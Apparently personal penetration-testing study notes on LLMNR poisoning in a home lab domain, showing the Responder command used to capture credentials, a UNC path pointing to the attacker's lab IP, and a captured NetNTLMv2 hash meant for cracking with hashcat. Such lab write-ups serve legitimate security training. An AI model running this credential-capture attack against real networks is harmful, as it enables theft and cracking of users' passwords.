Internal Attack | LLMNR Poisoning
When DNS fails to resolve the address than LLMNR comes into Play.
the victim goes out and say Hey does anybody on this network know how to reach this hackm folder
and this is the broadcast message send over the network.

And if as a hacker we are able to intercept the request and respond to the request than we will be
able to get the hash of the user and later try to crack it using hashcat.

____________

We have to make sure the all the Poisoners are on as well as HTTP and SMB server should be on.

Attacker IP address
192.168.17.136

\\192.168.17.136

Domain IP address
192.168.17.139

Fcastle
192.168.17.140

```
sudo responder -I eth0 -dwP
```
![[Pasted image 20240120110349.png]]

```
\\<Attacker_IP>
```
![[Pasted image 20240120110444.png]]

![[Pasted image 20240120110426.png]]

Volla we got the hash
![[Pasted image 20240120110605.png]]

```
fcastle::MARVEL:015256776752596b:A08EC0BBABA370DF3F95CDB62EB23C75:0101000000000000007A08F1374BDA01C8CA6C9BDF35475E0000000002000800510053004500560001001E00570049004E002D00480059004D003700350046005800440039004900460004003400570049004E002D00480059004D00370035004600580044003900490046002E0051005300450056002E004C004F00430041004C000300140051005300450056002E004C004F00430041004C000500140051005300450056002E004C004F00430041004C0007000800007A08F1374BDA0106000400020000000800300030000000000000000100000000200000CA3912724EB0CEF57704DF8415709906F57F5EB3AD4AEE2EF77B6300719690710A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310037002E003100330036000000000000000000
```

We can use hash-cat and crack the hash

